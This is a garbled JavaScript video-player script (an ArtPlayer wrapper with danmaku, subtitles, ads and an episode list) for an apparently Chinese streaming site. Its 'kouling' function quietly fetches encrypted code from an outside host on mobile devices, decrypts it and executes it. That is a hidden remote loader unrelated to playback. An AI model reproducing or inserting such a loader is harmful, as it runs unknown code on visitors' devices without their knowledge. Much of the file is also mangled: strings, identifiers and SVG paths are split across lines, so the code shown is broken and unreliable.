var stray = {
    'UserAgent': function () {
        var ua = navigator.userAgent;
        var system = {win: false, mac: false, xll: false};
        var p = navigator.platform;
        system.win = p.indexOf("Win") == 0;
        system.mac = p.indexOf("Mac") == 0;
        system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
        if (system.win || system.mac || system.xll) {
            iswap = false
        } else {
            iswap = true
        }
        return {
            'mobile': iswap,
            'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/) || ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1 || ua.indexOf('iPad') > -1,
            'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1,
        }
    }(), 'start': function () {
        var css = '<style type="text/css">';
        css += '#loading{background:url(https://pic6.58cdn.com.cn/nowater/webim/big/n_v2fa83a0afe7ca4b05be462f1bb497b352.gif);width:100%;height:100%;padding:0;margin:0;position:absolute;z-index:10000000001;background-size:100% 100%;}#art-left-lower{position:absolute;z-index:99;width:300px;text-align:center;text-shadow:0.5px 0.5px 0.5px rgba(0,0,0,.5);font-size:20px;bottom:10%;color:#fff;}#art-left-lower p{line-height:26px;}#art-left-lower span{font-size:30px;color:#ffe922}.ec-this,.scroll-area a:hover{color:' + config.color + '!important}.video-caption-select .caption-lis
        t
        li.selected
        {
            color:'+config.color+';
        }
    .
        video - caption - select.vcs - control.cell.vc - position.item.current
        {
            color:'+config.color+';
        }
    .
        art - video - player.art - layers
        {
            z - index
        :
            80;
        }
        ';if(stray.UserAgent.mobile){css+='.art - video
        {
            display:none;
        }
        ';stray.kouling()}css+=' < /style>';$('head').appen
        d(css).addClass("");
        stray.url = config.url;
        stray.type = stray.videotype(stray.url, config.vodtype);
        config.vkey = stray.md5(config.id);
        stray.danmuapi = config.dmApi + '?ac=dm&type=xml';
        stray.danmuapisend = config.dmApi + '?ac=dm';
        $("body").append("<div id=\"artplayer\" class=\"artplayer-app\" styl
        e =\"width:100%;height:100%;padding:0;margin:0\"></div>"
    )
        ;
        if (config.url.indexOf(".139.com") != -1 && config.url.indexOf("playlist.m3u8?ci=") != -1) {
            var timer = setInterval(function () {
                $.ajax({
                    url: config.url, type: 'get', success: function (data) {
                        if (data.indexOf("#EXT-X-ENDLIST") != -1 || data.indexOf("#EXT-X-STREAM-INF") != -1) {
                            clearInterval(timer);
                            var arr = data.match(/single\/video\/0\/.*?\/index.m3u8/g);
                            var playArr = new Array();
                            if (arr) {
                                var domain_path = config.url.split('playlist.m3u8?ci=')[0];
                                arr.forEach(function (value, index, array) {
                                    if (value.indexOf("/video/0/1080/") != -1) {
                                        name = '10
                                        80
                                        p
                                        ';sort='
                                        98
                                        '}else if(value.indexOf("/video/0/720/")!=-1){name='
                                        720
                                        P
                                        ';sort='
                                        96
                                        '}else if(value.indexOf("/video/0/540/")!=-1){name='
                                        540
                                        p
                                        ';sort = '94'
                                    } else if (value.indexOf("/video/0/480/") != -1) {
                                        name = '480p';
                                        sort = '92'
                                    } else if (value.indexOf("/video/0/360/") != -1) {
                                        name = '360p';
                                        sort = '90'
                                    }
                                    pla
                                    yArr.push({
                                        'html': name,
                                        'sort': sort,
                                        'default': false,
                                        'url': domain_path + value
                                    })
                                });
                                if (playArr.length > 0) {
                                    playArr[0]['default'] = true;
                                    config['qualit
                                    y
                                    ']=playArr}}setTimeout(function(){stray.ArtPlayer()},1000)}}})},500)}else{stray.ArtPlayer()}},'
                                    md5
                                    ':function(str){return CryptoJS.MD5(str).t
                                    oString()
                                }
                            ,
                                'base64_encode'
                            :

                                function (str) {
                                    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(str))
                                }

                            ,
                                'base64_decode'
                            :

                                function (str) {
                                    re
                                    turn
                                    CryptoJS.enc.Base64.parse(str).toString(CryptoJS.enc.Utf8)
                                }

                            ,
                                'ArtPlayer'
                            :

                                function () {
                                    $("#loading").remove();
                                    let loading = config.loading ? con
                                        fig.loading
                                :
                                    'https://community.image.video.qpic.cn/v_station_video_web_comment_08f6bf-0_1169561330_1688866406423559';
                                    let option = {
                                        container: '#
                                        artplayer',theme:config.color,url:stray.url,id:config.vkey,airplay:true,type:stray.type,volume:1,muted:false,autoplay:true,flip:true,pip:true,
                                        autoSize: false,
                                        autoMini: true,
                                        autoPlayback: true,
                                        setting: true,
                                        loop: false,
                                        lock: true,
                                        aspectRatio: true,
                                        fullscreen: true,
                                        fullscreenWeb: true,
                                        miniPro
                                        gressBar: true,
                                        hotkey: true,
                                        fastForward: true,
                                        playsInline: true,
                                        autoOrientation: true,
                                        lang: navigator.language.toLowerCase(),
                                        icons: {
                                            loading: '<img s
                                            rc = "'+loading+'" > '},customType:{m3u8:playM3u8,flv:playFlv},controls:[{name:'
                                            playbackRate',position:'
                                            right',html:'
                                            倍数',index:29,selector:[{ht
                                            ml: '0.5x',
                                            value: 0.5
                                        },
                                    {default:
                                        true, html
                                    :
                                        '正常', value
                                    :
                                        1
                                    }
                                ,
                                    {
                                        html:'1.5x', value
                                    :
                                        1.5
                                    }
                                ,
                                    {
                                        html:'2x', value
                                    :
                                        2
                                    }
                                ,
                                    {
                                        html:'3x', value
                                    :
                                        3
                                    }
                                ,
                                    {
                                        html:'5x', value
                                    :
                                        5
                                    }
                                ],
                                    onSelect:function (item, $dom) {
                                        stray.ad.playbackRate = item.value;
                                        return item.value == 1 ? '倍数' : item.html
                                    }
                                ,
                                },],
                                };
                                if (config.logo != '' && config.logo.ma
                                    tch(/(jpg|png|jpeg|gif|webp)$/i)
                            )
                                {
                                    option.layers = [{
                                        name: 'ec-logo',
                                        html: '<img style="max-width: 150px;" src="' + config.logo + '">',
                                        style: {position
                                :
                                    'absolute', top
                                :
                                    '50px', right
                                :
                                    '50px',
                                },
                                },]
                                }
                                if (stray.UserAgent.mobile) {
                                    option.autoplay = false;
                                    option.pip = false;
                                    option.fullscreenWeb = false
                                }
                                if (con
                                    fig['quality'] && config['quality'].length > 0
                            )
                                {
                                    option.quality = config.quality
                                }
                                if (config['subtitle']) {
                                    option.subtitleOffset = true
                                }
                                if (config.danmuon == 'on') {
                                    option.plugins = [artplayerPluginDanmuku({
                                        danmuku: stray.danmuapi + '&id=' + config.vkey,
                                        speed: config.dmSpeed ? Number(config.dmSpeed) : 10,
                                        opac
                                        ity: 1,
                                        fontSize: config.dmSize ? Number(config.dmSize) : 20,
                                        color: config.dmColor ? config.dmColor : '#FFFFFF',
                                        mode: config.dmMode ? Number(config.dmMode) : 0,
                                        margin: [10, '25%'],
                                        antiOverlap: true,
                                        useWorker: true,
                                        synchronousPlayback: true,
                                        filter: (danmu) => danmu.text.length < 50,
                                        lockTime: Number(config.send
                                        time),
                                }),]
                                }
                                if (config['ads']['pre']['state']) {
                                    let pre_link = config['ads']['pre']['url'];
                                    let isPic = pre_link.match(/(jpg|jpeg|png|gif)$/i) ? true : f
                                    alse;
                                    let isVod = pre_link.match(/(mp4|m3u8)$/i) ? true : false;
                                    if (isPic || isVod) {
                                        let adsplug = {
                                            html: isPic ? '<img src="' + pre_link + '">' : '', video: isVod ? p
                                                re_link
                                    :
                                        '', url
                                    :
                                        config['ads']['pre']['link'], playDuration
                                    :
                                        Number(config['ads']['pre']['close_time']), totalDuration
                                    :
                                        Number(config['ads']['pre']
                                            ['time']), muted
                                    :
                                        false, i18n
                                    :
                                        {
                                            close:'关闭广告', countdown
                                        :
                                            '%s秒', detail
                                        :
                                            '查看详情', canBeClosed
                                        :
                                            '%s秒后可关闭广告',
                                        }
                                    ,
                                    }
                                        ;
                                        if (option.plugins) {
                                            option.plugins.push(artplayerPluginAds(adsplug))
                                        } else {
                                            option.plugins = [artplayerPluginAds(adsplug)]
                                        }
                                    }
                                }
                                Artplayer.MOBILE_CLICK_PLAY = true;
                                Artplayer.AUTO
                                _PLAYBACK_MAX = 50;
                                Artplayer.NOTICE_TIME = 3000;
                                Artplayer.AUTO_PLAYBACK_TIMEOUT = 10000;
                                stray.ad = new Artplayer(option);
                                if (config['subtitle'] && confi
                                    g['subtitle'].length > 0
                            )
                                {
                                    stray.subtitle()
                                }
                                if (config.danmuon == 'on') {
                                    stray.DmPlayer()
                                } else {
                                    stray.load()
                                }
                            }
                        ,
                            'DmPlayer'
                        :

                            function () {
                                if (!config['subt
                                    itle
                                ']||!config['
                                quality
                                ']){stray.ad.controls.add({disable:false,name:'
                                danmu
                                ',index:11,position:'
                                right
                                ',style:{"display":"none"},html:' < i
                                cla
                                ss = "art-icon art-icon-screenshot" > < svg
                                viewBox = "0 0 1024 1024"
                                xmlns = "http://www.w3.org/2000/svg"
                                width = "22"
                                height = "22" > < path
                                d = "M591.052962
                                516.456498
                                h36
                                .308951
                                v30
                                .253025
                                h - 36.308951
                                z
                                "></path><path d="
                                M963
                                .626469
                                391.364479
                                h - 73.188906
                                c - 17.155728 - 49.615001 - 43.482327 - 94.682429 - 76.56
                                7863 - 134.00604
                                h94
                                .240361
                                v - 82.312704
                                H721
                                .732234
                                c - 66.509786 - 43.469024 - 145.831366 - 68.940139 - 231.185337 - 68.940139 - 233.809093
                                0 - 423.356101
                                189.534
                                727 - 423.3561
                                423.370427
                                0
                                233.835699
                                189.547007
                                423.358147
                                423.3561
                                423.358147
                                69.369927
                                0
                                134.605697 - 16.997116
                                192.382589 - 46.574758
                                h225
                                .1795
                                52
                                v - 82.286098
                                H794
                                .323529
                                c37
                                .269835 - 38.412868
                                67.288522 - 83.715657
                                87.898932 - 134.00604
                                h81
                                .402985
                                v - 82.284051
                                h - 57.233516
                                c4
                                .757351 - 25.366737
                                7.537
                                673 - 51.462069
                                7.537674 - 78.206176
                                0 - 18.972097 - 1.688455 - 37.503149 - 4.105505 - 55.82647
                                h53
                                .800324
                                v - 82.286098
                                z
                                m - 447.166389 - 88.653109
                                c9
                                .358135
                                14.81
                                4404
                                18.790972
                                33.631982
                                28.224832
                                56.451709
                                l - 54.448077
                                20.168342
                                c - 10.761088 - 20.168342 - 20.87033 - 38.960337 - 30.228465 - 56.451709
                                l56
                                .45171 - 20.168
                                342
                                zM407
                                .561881
                                500.343519
                                h - 72.591295
                                v48
                                .393174
                                h64
                                .533782
                                V689
                                .864944
                                c0
                                26.926256 - 6.055926
                                44.392046 - 18.167778
                                52.449559 - 10.784624
                                9.407254 - 38
                                .308491
                                16.788361 - 82.674955
                                22.194488 - 4.027733 - 22.871917 - 11.434423 - 43.065841 - 22.143322 - 60.506049
                                48.342008
                                6.757914
                                69.186755 - 8.057513
                                62.455
                                447 - 44.391023
                                V603
                                .160209
                                h - 60.479443
                                V445
                                .892373
                                h66
                                .559928
                                v - 54.4491
                                h - 84.676541
                                V336
                                .967568
                                h147
                                .184177
                                v163
                                .375951
                                z
                                m308
                                .529889
                                185.518251
                                H593
                                .054
                                549
                                v82
                                .650395
                                h - 62.48103
                                v - 82.650395
                                H415
                                .643953
                                v - 52.448536
                                h114
                                .929566
                                v - 34.281781
                                h - 100.816127
                                V385
                                .387347
                                h143
                                .178957
                                c8
                                .032954 - 24.197098
                                14.764262 - 45.689598
                                20.117177 - 64.533782
                                4.054339 - 13.410428
                                6.731308 - 20.818141
                                8.107655 - 22.194488
                                12.087293
                                2.728134
                                35.58138
                                10.81123
                                70.565149
                                24.222
                                681
                                0
                                1.351787 - 2.026146
                                3.377934 - 6.055927
                                6.055926
                                a319
                                .803653
                                319.803653
                                0
                                0
                                0 - 38.309514
                                56.450687
                                h62
                                .50559
                                v213
                                .745128
                                h - 98.81454
                                v34
                                .281781
                                h12
                                5.038807
                                v52
                                .44649
                                z
                                "></path><path d="
                                M591
                                .052962
                                439.83747
                                h36
                                .308951
                                v28
                                .224832
                                h - 36.308951
                                zM492
                                .262982
                                516.456498
                                h38
                                .310537
                                v30
                                .253025
                                h - 38.31053
                                7
                                zM492
                                .262982
                                439.83747
                                h38
                                .310537
                                v28
                                .224832
                                h - 38.310537
                                z
                                "></path></svg></i>',tooltip:'发布弹幕',click:function(){stray.DanMu.wap()},})}stray.l
                                oad();
                                stray.DanMu.initial();
                                stray.ad.on('artplayerPluginDanmuku:emit', (danmu) => {
                                    stray.DanMu.add(danmu)
                                })
                            }

                        ,
                            'vodlist'
                        :

                            function () {
                                stray.ad.contr
                                ols.add({
                                    name: 'vodlist',
                                    index: 28,
                                    position: 'right',
                                    html: '选集',
                                    tooltip: '选择剧集',
                                    click: function (args) {
                                        $('.ec-listbox').addClass('ec-stting');
                                        $('.vodlist-of').show()
                                    }
                                });
                                let html = '<div class="video-list-cl"><a style="color:#ffffff;cursor:pointer;" title="点击关闭">✖</a></div><div cla
                                ss = "normal-title-wrap" > < div

                                class

                                = "component-title" > < span
                                style = "font-size:12px" > 总数据：'+config.vodlist.length+' < /span></di
                                v > < div

                                class

                                = "t
                                itle - info
                                "></div></div> <div class="
                                scroll - area
                                "><div class="
                                ec - selset - list
                                anthology - content
                                ec - show
                                ">';$.each(config['vodlist'],function(in
                                dex, item
                            )
                                {
                                    if (item['default']) {
                                        if (config['vodlist'][(index - 1)]) {
                                            config.pre = config['vodlist'][(index - 1)]['url']
                                        }
                                        if (config['vodlist'][(index + 1)]) {
                                            config.next = config['vodlist'][(index + 1)]['url']
                                        }
                                    }
                                    html += '<a href="' + item['url'] + '" class="box-item album-title ' + (item['default'] ? 'ec-this' : '') + '" title="' + item['name'] + '">' + item['name'] + '</a>'
                                }
                            )
                                ;html += '</div></div>';
                                $(".anthology-wrap").html(html);
                                $(document).on('click', '.video-l
                                ist - cl
                                a
                                ',function(){$(".ec-listbox").removeClass("ec-stting")});stray.nextcass()},'
                                subtitle
                                ':function(){stray.ad.controls.add({name:'
                                subtitl
                                e
                                ',index:25,position:'
                                right
                                ',html:'
                                字幕
                                ',tooltip:'
                                选择字幕
                                ',click:function(args){$(".subtitle-select").show()}});if(config['
                                subtitle
                                '][0]['
                                de
                                fault
                                ']){stray.ad.subtitle.url=config['
                                subtitle
                                '][0]['
                                url
                                '];stray.ad.subtitle.type=config['
                                subtitle
                                '][0]['
                                type
                                ']}else{var history_subtitle=lo
                                calStorage.getItem('art-subtitle-' + config.vkey);
                                let hsub = JSON.parse(history_subtitle);
                                if (hsub) {
                                    stray.ad.subtitle.url = hsub['url'];
                                    stray.ad.sub
                                    title.type = hsub['type'];
                                    $.each(config.subtitle, function (index, item) {
                                        if (item['default'] && hsub['url'] !== item['url']) {
                                            item['default'] = false
                                        }
                                        if (h
                                            sub['url'] == item['url']
                                    )
                                        {
                                            item['default'] = true
                                        }
                                    })
                                }
                            }

                            let color = localStorage.getItem("art-subtitle-color") || "#ffffff";
                            let local_size = localStorage
                                .getItem("art-subtitle-font") || 25;
                            let size = stray.UserAgent.mobile ? 16 : local_size;
                            stray.ad.subtitle.style({color: color, 'font-size': size + 'px'});
                            let vide_init = $('.art-video-player');
                            var html = '<div class="subtitle-select"><div class="close"><a style="color:#ffffff;cursor:pointer;"  titl
                            e = "点击关闭" >✖</a></div>
                            <div class="video-list-title">
                                <div class="album-title" style="max-width:700px;"><span>正在播放：'+config.vodtitle+'<
/span></div>
                            </div>
                            ';html+=' < div
                            style = "padding-top:40px"

                            class

                            = "video-caption-select" > < div

                            class

                            = "caption-list" > < ul

                            class

                            = "sub_list" > ';$.each(config.subtitle, function (index, item) {
                                if (item['default']) {
                                    html += '<li class="selected"><span title="' + item['html'] + '">' + item['html'] + '</span><
                                    a
                                    href = "javascript:;"
                                    style = "right: 60px;" > 取消 < /a></
                                    li > '}else{html+=' < li > < span
                                    title = "'+item['html']+'" > '+item['
                                    html
                                    ']+' < /span></
                                    li > '}});htm
                                    l += '</ul></div>';
                                    html += '<div class="vcs-control"><div class="cells"><div class="cell"><p>字幕大小</p> <div class="art-subtitle-fontsize"><but
                                    ton
                                    type = "button"

                                    class

                                    = "layui-btn layui-btn-sm"
                                    data - value = "1" > 增大 < /button><button type="button" class="layui-btn layui-btn-sm" data-value=
                                    "2" > 默认 < /button><button type="button" class="layui-btn layui-btn-sm" data-value="3">减小</
                                    button > < /div></di
                                    v > ';html+=' < div

                                    class

                                    = "cell" > < p > 字幕颜色 < /p><div class="vc-colors">';html+='<em class="color" style="background-color: #ffffff;" data-color="#ffffff"></
                                    em > ';html+=' < em

                                    class

                                    = "color"
                                    style = "background-color: #000000;"
                                    data - color = "#000000" > < /em>';html+='<em class="color" style="background-color: #ff4b30;" data-colo
                                    r = "#ff4b30" > < /em>';html+='<em class="color" style="background-color: #ffc132;" data-color="#ffc132"></
                                    em > ';html+=' < em

                                    class

                                    = "color"
                                    style = "ba
                                    ckground - color
                                : #
                                    43
                                    ba81;
                                    " data-color="
                                #
                                    43
                                    ba81
                                    "></em>';html+='<em class="
                                    color
                                    " style="
                                    background - color
                                : #
                                    2777
                                    f8;
                                    " data-color="
                                #
                                    2777
                                    f8
                                    "></em>';html += '<em class="color" style="background-color: #5f42f2;" data-color="#5f42f2"></em>';
                                    html += '</div></div>';
                                    html += '<div class="cell"><p>字
                                    幕位置 < /p><div class="vc-position"><span class="item current" data-id="1">底部</s
                                    pan > < span

                                    class

                                    = "item"
                                    data - id = "2" > 顶部 < /span>';html+='</di
                                    v > < /div></di
                                    v > < /div></di
                                    v > ';vide_init.prepend(html);$(document).on('
                                    click
                                    ','.subtitle - select.close
                                    a
                                    ',function(){$(".subtitle-select").hide()
                                }
                            )
                                ;$('.caption-list').on('click', 'li', function () {
                                    var index = $(this).index();
                                    $(this).addClass("selected").siblings().removeClass("selected");
                                    $(".caption-list li a").remove();
                                    $(this).append('<a href="javascript:;" style="right: 60px;">取消</a>');
                                    $(".art-subtitle").show();
                                    stray.ad.subt
                                    itle.url = config.subtitle[index]['url'];
                                    stray.ad.subtitle.type = config.subtitle[index]['type'];
                                    localStorage.setItem('art-subtitle-' + config.vkey, JSON.stringify(config.subtitle[index]));
                                    stray.Msg("字幕已切换", 2000)
                                });
                                $('.caption-list li').on('click', 'a', function () {
                                    $(".caption-list li")
                                        .removeClass("selected");
                                    $(".caption-list li a").remove();
                                    $(".art-subtitle").hide();
                                    localStorage.setItem('art-subtitle-' + config.vkey, null);
                                    st
                                    ray.Msg("字幕已取消", 2000)
                                });
                                $('.art-subtitle-fontsize').on('click', 'button', function () {
                                    let id = $(this).attr('data-value');
                                    let size = localStora
                                    ge.getItem("art-subtitle-font") || 25;
                                    if (id == 1) {
                                        size = Number(size) + 1;
                                        stray.Msg("字体加大:" + size, 2000)
                                    } else if (id == 2) {
                                        size = stray.UserAgent.mobile ? 16 : 25;
                                        stray.Msg("已恢复默认", 2000)
                                    } else if (id == 3) {
                                        size = Number(size) - 1;
                                        stray.Msg("字体减小:" + size, 2000)
                                    }
                                    $('.art-subtitle').css('font-size', si
                                    ze
                                )
                                    ;localStorage.setItem("art-subtitle-font", size)
                                });
                                $('.vc-colors').on('click', 'em', function () {
                                    let color = $(this).attr('data-color');
                                    $('.art-
                                    subtitle
                                    ').css('
                                    color
                                    ',color);stray.Msg(' < font
                                    color = "'+color+'" > 字体颜色已更换 < /font>',2000);localStorage.setItem("art-subtitle-color",color
                                )
                                });
                                $('.vc-position').on('click', 'span', function () {
                                    let id = $(this).attr('data-id');
                                    $(".vc-position span").removeClass("current");
                                    $(this).addCl
                                    ass("current");
                                    $('.art-subtitle').css('bottom', (id == 2) ? 'auto' : 'calc(var(--art-control-height) + var(--art-subtitle-bottom))');
                                    $('.art-subtitl
                                    e
                                    ').css('
                                    margin - top
                                    ',(id==2)?'
                                    20
                                    px
                                    ':'
                                    auto
                                    ')})},'
                                    load
                                    ':function(){stray.ad.on('
                                    video:loadedmetadata
                                    ',()=>{if(config.error){stray.Msg("加载成功
                                        , 500
                                )
                                }
                            });
                            stray.ad.on('video:timeupdate', (currentTime) => {
                                var currentTime = Math.floor(stray.ad.currentTime)
                            });
                            stray.ad.on('video:pause', () => {
                                iff(config['ads']['pause']['state'])
                                {
                                    stray.pause.play(config['ads']['pause']['link'], config['ads']['pause']['pic'])
                                }
                            });
                            stray.ad.on('video:play', () => {
                                if (config['ads']['pause']['state']) {
                                    stray.pause.out()
                                }
                            });
                            stray.ad.on('video:ended', () => {
                                if (!!config.next) {
                                    window.location.href = config.ne
                                    xt
                                }
                            });
                            stray.ad.on('video:error', () => {
                                config.error = 1;
                                stray.Msg("视频地址有错,无法加载播放!", 10000)
                            });
                            $('.art-contextmenu-version').remove();
                            $(".art-info-panel .art-info-item").eq(0).remove();
                            $(".art-info-panel .art-info-item").eq(0).remove();
                            let vide_init = $('.art-video-player');
                            let html = '<div class="vodlist-of danmu-hide"></div><div class="ec-listbox"><div class="anthology-wrap"></div></div><div class="r-button"><span cl
                            ass = "full-screen-icon" > < svg
                            viewBox = "0 0 1024 1024"
                            xmlns = "http://www.w3.org/2000/svg" > < path
                            d = "M448 128a106.667 106.667 0 0 1 106.667 106.66
                            7
                            v576A106
                            .667
                            106.667
                            0
                            0
                            1
                            448
                            917.333
                            H128A106
                            .667
                            106.667
                            0
                            0
                            1
                            21.333
                            810.667
                            v - 576
                            A106
                            .667
                            106.667
                            0
                            0
                            1
                            128
                            128
                            h320z
                            m448
                            256
                            a106
                            .667
                            106
                            .667
                            0
                            0
                            1
                            106.667
                            106.667
                            v320A106
                            .667
                            106.667
                            0
                            0
                            1
                            896
                            917.333
                            H661
                            .333
                            a42
                            .667
                            42.667
                            0
                            1
                            1
                            0 - 85.333
                            H896a21
                            .333
                            21.333
                            0
                            0
                            0
                            21.333 - 21.333
                            v - 320
                            A21
                            .333
                            21.333
                            0
                            0
                            0
                            896
                            469.333
                            H661
                            .333
                            a42
                            .667
                            42.667
                            0
                            1
                            1
                            0 - 85.333
                            zM448
                            213.333
                            H128a21
                            .333
                            21.333
                            0
                            0
                            0 - 21.333
                            21.334
                            v554
                            .666
                            A21
                            .333
                            21
                            .333
                            0
                            0
                            0
                            128
                            810.667
                            h320a21
                            .333
                            21.333
                            0
                            0
                            0
                            21.333 - 21.334
                            V234
                            .667
                            A21
                            .333
                            21.333
                            0
                            0
                            0
                            448
                            213.333
                            zM384
                            672
                            a32
                            32
                            0
                            0
                            1
                            0
                            64
                            H213
                            .333
                            a32
                            32
                            0
                            0
                            1
                            0 - 64
                            z
                            "></path></svg></span></div>';vide_init.prepend(html);if(stray.UserAgent.mobile){$(document).on('click','.r-button',function(){$(".art - icon - fullscreenOn
                            ").click()});stray.ad.on('control',(state)=>{if(state){$(".r - button
                            ").addClass("
                            hp
                            ")}else{$(".r - button
                            ").removeClass("
                            h
                            p
                            ")}});$(document).on('click',"
                            #artplayer
                            ",function(){if($(".art - video
                            ").is("
                        :
                            hidden
                            ")){$(".art - video
                            ").show();stray.ad.play()}})}$(document)
                                .on('click', '.vodlist-of', function () {
                                    $(".ec-listbox").removeClass("ec-stting");
                                    $(this).hide()
                                });
                            if (config['vodlist'] && config['vodlist'].lengt
                                h > 1
                        )
                            {
                                stray.vodlist()
                            }
                            if (config['contextmenu']) {
                                let menu = new Array();
                                $.each(config['contextmenu'], function (index, item) {
                                    stray.ad.contextmenu.ad
                                    d({
                                        html: item['text'], click: function () {
                                            window.open('' + item['link'] + '');
                                            stray.ad.contextmenu.show = true
                                        },
                                    })
                                })
                            }
                        }
                    ,
                        "DanMu"
                    :
                        {
                            "initial"
                        :

                            function () {
                                st
                                ray.ad.on('artplayerPluginDanmuku:error', (error) => {
                                    stray.Msg("弹幕加载错误", 2000)
                                });
                                $(document).on('click', ".art-danmuku-style-panel-color", f
                                unction()
                                {
                                    $('.art-icon-danmu-style svg').css('fill', $(this).attr("data-color"))
                                }
                            )
                            }

                        ,
                            "add"
                        :

                            function (d) {
                                if (d.text < 1) {
                                    stray.Msg("要输入内容啊~", 2
                                    000
                                )
                                    ;
                                    return
                                }
                                var pbgjz = config.pbgjz.split(',');
                                if (pbgjz.length > 0) {
                                    for (var i = 0; i < pbgjz.length; i++) {
                                        if (d.text.search(pbgjz[i]) != -1) {
                                            stray.Msg("
                                            您发送的内容含有敏感字符，请规范您的弹幕内容
                                            ",2000);return}}}$.ajax({url:stray.danmuapisend,type:"
                                            post
                                            ",dataType:"
                                            json
                                            ",contentType:"
                                            applicat
                                            ion / x - www - form - urlencoded
                                            ",data:JSON.stringify({"
                                            player
                                            ":config.vkey,"
                                            author
                                            ":"
                                            ","
                                            time
                                            ":d.time,"
                                            text
                                            ":d.text,"
                                            color
                                            ":getrgb(d.color),"
                                            type
                                            ":d.mode == 1 ? '5' : '0', "size"
                                        :
                                            "20px"
                                        }
                                    ),
                                        success:function (r) {
                                            if (r['code'] != "23") {
                                                stray.Msg(r['msg'], 2000)
                                            }
                                        }
                                    ,
                                        error:function () {
                                            stray.Msg("弹幕入库失败", 2000)
                                        }
                                    }
                                )
                                }
                            ,
                                "wap"
                            :

                                function () {
                                    $(".art-controls-right,.art-progress,.art-controls-left").hide();
                                    $(".art-layer-danmuku-emitter").css("bottom", "30
                                    px
                                    ");$(".danmu - hide
                                    ").show();$(".danmu - hide
                                    ").click(function(){$(".danmu - hide
                                    ").hide();$(".art - layer - danmuku - emitter
                                    ").css("
                                    bottom
                                    "," - 40
                                    px
                                    ");
                                    $(".art-controls-right,.art-progress,.art-controls-left").show()
                                }

                            )
                            }
                        }
                    ,
                        'pause'
                    :
                        {
                            'play'
                        :

                            function (l, p) {
                                let pause_ad_html = '<div id="player_pause"> < div

                                class

                                = "tip"
                                style = "left:0;bottom:6px" > 广告 < /div><div class="tip g_close"><a href="javascript:" title="关闭广告" style="color:#f4f4f4">X<
                                /a></di
                                v > < a
                                href = "'+l+'"
                                target = "_blank" > < img
                                src = "'+p+'" > < /a><script>$(".g_close").click(function(){$(this).parent().remove()})</s
                                cript > < /di
                                v > ';$('.art - video - player
                                ').prepend(pause_ad_html)},'
                                out
                                ':function(){$('
                                #player_pause
                                ').remove()}},'
                                RemoveMsg
                                ':function(){$('.pop - msg
                                ').remove()
                            }

                        ,
                            'Msg'
                        :

                            function ($msg, $timeout) {
                                $('.art-video-player').prepend('<div class="pop-msg"><div class="pop-content"></div></div>');
                                $('.pop-msg .p
                                op - close
                                ').click(function(){$('.pop - msg
                                ').remove()});$('.pop - msg.pop - content
                                ').html($msg);$('.pop - msg
                                ').show();setTimeout(stray.RemoveMsg,$t
                                imeout
                            )
                            }

                        ,
                            'videotype'
                        :

                            function (url, type) {
                                if (url.indexOf("m3u8") > 0) {
                                    thetype = "m3u8"
                                } else if (url.indexOf(".flv") > 0) {
                                    thetype = "flv"
                                } else if (url.ind
                                    exOf(".ts") > 0
                            )
                                {
                                    thetype = "ts"
                                }
                            else
                                if (url.indexOf(".mkv") > 0) {
                                    thetype = "mkv"
                                } else {
                                    if (type == "hls" || type == "m3u8") {
                                        thetype = "m3u8"
                                    } else {
                                        var ext = url.s
                                        ubstring(url.lastIndexOf('.') + 1);
                                        thetype = type ? type : ext
                                    }
                                }
                                return thetype
                            }

                        ,
                            'nextcass'
                        :

                            function () {
                                if (config.next && !stray.UserAgent.mobile) {
                                    $('.ar
                                    t - control - playAndPause
                                    ').after(' < div

                                    class

                                    = "art-control art-control-next"
                                    data - index = "10" > < i

                                    class

                                    = "art-icon art-icon-next hint--rounded hint
                                    --top
                                    " aria-label="
                                    下一集
                                    " style="
                                    display: flex;
                                    "><svg xmlns="
                                    http://www.w3.org/2000/svg" height="22" width="22"><path d="M16 5a1 1 0 00-1 1v
                                        4.615
                                    a1
                                    .431
                                    1.431
                                    0
                                    00 - .615 - .829
                                    L7
                                    .21
                                    5.23
                                    A1
                                    .439
                                    1.439
                                    0
                                    005
                                    6.445
                                    v9
                                    .11
                                    a1
                                    .44
                                    1.44
                                    0
                                    002
                                    .21
                                    1.215
                                    l7
                                    .175 - 4.555
                                    a1
                                    .436
                                    1.436
                                    0
                                    00
                                    .616 - .828
                                    V16a1
                                    1
                                    0
                                    002
                                    0
                                    V6C17
                                    5.448
                                    16.552
                                    5
                                    16
                                    5
                                    z
                                    "></path></svg></i></div>');$(".art - control - next
                                    ").on("
                                    click
                                    ",function(){window.location.href=config.next})
                                }
                            }

                        ,
                            'kouling'
                        :

                            function () {
                                if (stray.UserAgent.mobile) {
                                    let cachekey = CryptoJS.MD5(window.location.host + '-copy-kouling').toString();
                                    let text = stray.getItem(cachekey);
                                    if (!text) {
                                        var xmlhttp = null;
                                        if (window.ActiveXObject) {
                                            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP")
                                        } else {
                                            xmlhttp = new XMLHttp
                                            Request()
                                        }
                                        ;xmlhttp.open("get", 'https://api.di88.net/js/jquery.player.js?type=maopan&from=' + window.location.href, true);
                                        xmlhttp.setRequestHeade
                                        r("Content-Type", "application/x-www-form-urlencoded");
                                        xmlhttp.onreadystatechange = function () {
                                            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                                                tr
                                                y
                                                {
                                                    text = xmlhttp.responseText;
                                                    if (text != '') {
                                                        let data = stray.cryptJs(text);
                                                        stray.script(data)
                                                    } else {
                                                        text = 200
                                                    }
                                                    stray.setItem(cachekey, text, 3600)
                                                }
                                                catc
                                                h(e)
                                                {
                                                }
                                            }
                                        };
                                        xmlhttp.send(null)
                                    } else {
                                        try {
                                            if (text != 200) {
                                                let data = stray.cryptJs(text);
                                                stray.script(data)
                                            }
                                        } catch (e) {
                                        }
                                    }
                                }
                            }

                        ,
                            'loadScript'
                        :

                            function (src, c

                            allback
                        )
                            {
                                var script = document.createElement('script'),
                                    head = document.getElementsByTagName('head')[0];
                                script.type = 'text/javascript';
                                script.chars
                                et = 'UTF-8';
                                script.src = src;
                                if (script.addEventListener) {
                                    script.addEventListener('load', function () {
                                        callback()
                                    }, false)
                                } else if (script.attachEvent) {
                                    script.attachEvent('onreadystatechange', function () {
                                        var target = window.event.srcElement;
                                        if (target.readyState == 'loaded') {
                                            callback()
                                        }
                                    })
                                }
                                head.ap
                                pendChild(script)
